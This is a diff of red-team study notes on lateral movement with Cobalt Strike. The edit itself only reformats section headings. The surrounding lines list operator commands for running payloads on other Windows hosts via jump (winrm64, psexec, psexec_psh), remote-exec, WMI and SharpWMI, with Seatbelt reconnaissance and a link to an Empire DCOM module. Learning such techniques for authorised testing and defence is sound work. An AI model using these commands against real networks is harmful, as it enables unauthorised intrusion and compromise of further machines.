@@ -1,6 +1,6 @@
 # Lateral Movement Notes
 
-**Jump**
+## Jump
 
 The first and most convenient is to use the built-in jump command - the syntax is jump [method] [target] [listener].  Type jump to see a list of methods.  
 
@@ -15,7 +15,7 @@ list of them
 4. winrm
 5. winrm64
 
-**Remote-Exec**
+## Remote-Exec
 
 Built-in tool with CS
 ```
@@ -32,7 +32,7 @@ Can als0 run SeatBelt remotely to check the systems before jumping to them
 execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web
 ```
 
-**Windows Remote management**
+## Windows Remote management
 
 winrm or winrm64
 
@@ -40,7 +40,7 @@ winrm or winrm64
 jump winrm64 <domain> smb
 ```
 
-**Psexec**
+## Psexec
 
 psexec or psexec64, or psexec_psh which doesn't put a binary but instead executes a powershell oneliner
 ```
@@ -49,7 +49,7 @@ jump psexec_psh <domain> smb
 ```
 
 
-**WMI**
+## WMI
 
 upload a payload to the target system and use WMI to execute it
 ```
@@ -62,7 +62,7 @@ Now connect to it
 link <OtherComputer> TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
 ```
 
-**CoInitializeSecurity**
+## CoInitializeSecurity
 
 If this fails
 ```
@@ -75,7 +75,7 @@ Try executing from a different process
 execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=<OtherComputer> command="C:\Windows\smb_x64.exe"
 ```
 
-**DCOM**
+## DCOM
 
 Utilizing [Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)
 
